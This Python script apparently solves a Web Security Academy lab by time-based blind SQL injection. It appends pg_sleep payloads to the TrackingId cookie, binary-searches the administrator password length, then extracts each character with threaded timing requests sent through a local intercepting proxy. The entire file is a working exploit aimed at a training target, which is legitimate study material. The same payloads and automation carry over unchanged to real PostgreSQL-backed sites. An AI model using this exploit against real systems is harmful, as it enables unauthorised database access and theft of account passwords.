import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event
from urllib.parse import quote

import requests as r
import urllib3
from rich.console import Console
from rich.traceback import install

install()

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s: r.Session = r.Session()
console: Console = Console()

charset = string.ascii_letters + string.digits + "_$"
s.verify = False
print = console.print

s.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}


def main() -> None:
    URL = "https://0a1500c5048140fd80c40de4006f00c7.web-security-academy.net/filter?category=Pets"
    s.get(URL)

    tracking_id = s.cookies.get("TrackingId")
    session = s.cookies.get("session")

    _high = 40
    _low = 0
    _sleep = 5
    while _low < _high:
        start = time.perf_counter()

        mid = (_low + _high) // 2

        print(f"Trying...")

        r.get(
            URL,
            cookies={
                "TrackingId": tracking_id
                + f"' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>{mid}) THEN pg_sleep({_sleep}) ELSE pg_sleep(0) END FROM users)--",
                "session": session,
            },
        )

        elapsed = time.perf_counter() - start

        if elapsed >= _sleep:
            _low = mid + 1
        else:
            _high = mid

    length = _low

    def find_char(idx, dct):
        stop_event = Event()

        def check_char(ch):
            start = time.perf_counter()

            if stop_event.is_set():
                return ch, False

            r.get(
                URL,
                cookies={
                    "TrackingId": tracking_id
                    + f"' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{idx},1)='{ch}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--",
                    "session": session,
                },
            )

            elapsed = time.perf_counter() - start

            if elapsed >= 5:
                stop_event.set()
                dct[idx] = ch

                return ch, True

            return ch, False

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_char, ch) for ch in charset]
            for _ in as_completed(futures):
                if stop_event.is_set():
                    for f in futures:
                        f.cancel()  # Only cancels tasks that haven't started

                    break

    dct = {}

    with ThreadPoolExecutor(max_workers=1) as executor:
        for _ in as_completed(
            [executor.submit(find_char, idx, dct) for idx in range(1, length + 1)]
        ):
            print("".join(dict(sorted(dct.items(), key=lambda item: item[0])).values()))


if __name__ == "__main__":
    main()
